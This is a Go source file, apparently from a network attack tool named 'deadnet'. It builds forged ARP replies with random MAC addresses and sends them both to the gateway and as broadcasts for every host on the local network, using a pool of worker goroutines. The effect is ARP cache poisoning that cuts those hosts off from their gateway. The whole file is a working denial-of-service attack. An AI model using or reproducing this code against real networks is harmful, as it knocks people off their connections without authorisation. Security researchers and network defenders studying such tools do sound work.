package main

import (
	"context"
	"encoding/binary"
	"net"
	"sync"

	"deadnet/utils"
)

var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

func buildARPReply(srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) []byte {
	payload := make([]byte, 28)
	binary.BigEndian.PutUint16(payload[0:2], 0x0001)
	binary.BigEndian.PutUint16(payload[2:4], 0x0800)
	payload[4] = 6
	payload[5] = 4
	binary.BigEndian.PutUint16(payload[6:8], 0x0002)
	copy(payload[8:14], srcMAC)
	copy(payload[14:18], srcIP.To4())
	copy(payload[18:24], dstMAC)
	copy(payload[24:28], dstIP.To4())
	return payload
}

func (d *DeadNet) poisonARPSingleHost(host net.IP) {
	if host == nil {
		return
	}
	if randMAC, err := utils.RandomMAC(); err == nil {
		frame := buildEthernetFrame(d.gatewayMAC, d.iface.HardwareAddr, ethPARP,
			buildARPReply(randMAC, host, d.gatewayMAC, d.gatewayIPv4Addr))
		_ = d.rawSender.send(frame, ethPARP, d.gatewayMAC)
	}
	if randMAC, err := utils.RandomMAC(); err == nil {
		frame := buildEthernetFrame(broadcastMAC, d.iface.HardwareAddr, ethPARP,
			buildARPReply(randMAC, d.gatewayIPv4Addr, broadcastMAC, host))
		_ = d.rawSender.send(frame, ethPARP, broadcastMAC)
	}
}

func (d *DeadNet) poisonARP(ctx context.Context) {
	workerCount := 10
	if len(d.hostIPv4s) < workerCount {
		workerCount = len(d.hostIPv4s)
	}
	if workerCount == 0 {
		return
	}
	jobs := make(chan net.IP)
	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
				}
				d.poisonARPSingleHost(ip)
			}
		}()
	}

	for _, ip := range d.hostIPv4s {
		select {
		case <-ctx.Done():
			close(jobs)
			wg.Wait()
			return
		default:
		}
		jobs <- ip
	}
	close(jobs)
	wg.Wait()
}
